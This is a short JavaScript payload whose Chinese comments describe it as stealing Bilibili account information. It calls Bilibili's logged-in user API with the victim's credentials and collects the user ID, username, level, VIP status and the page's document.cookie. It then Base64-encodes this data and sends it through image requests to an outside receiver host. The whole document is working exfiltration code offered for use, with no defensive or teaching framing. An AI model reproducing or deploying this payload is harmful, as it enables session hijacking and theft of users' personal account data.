// 窃取 B 站账户信息并 Base64 编码发送
(function() {
    // 目标 API：获取当前登录用户信息
    var api = 'https://api.bilibili.com/x/web-interface/nav';

    fetch(api, { credentials: 'include' })
        .then(res => res.json())
        .then(json => {
            if (json.code === 0) {
                // 提取关键信息
                var data = {
                    uid: json.data.mid,
                    uname: json.data.uname,
                    face: json.data.face,
                    level: json.data.level_info.current_level,
                    vip: json.data.vipStatus,
                    isLogin: json.data.isLogin,
                    // 可选：本地 Cookie（若需要）
                    localCookie: document.cookie
                };
                // 转为 JSON 字符串，然后 Base64 编码
                var payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
                // 发送到你的接收器
                new Image().src = 'https://test.qazqazqaz762000.eu.org/?c=' + encodeURIComponent(payload);
            } else {
                // 未登录或 API 失败
                new Image().src = 'https://test.qazqazqaz762000.eu.org/?c=error_' + json.code;
            }
        })
        .catch(e => {
            new Image().src = 'https://test.qazqazqaz762000.eu.org/?c=error_fetch';
        });
})();
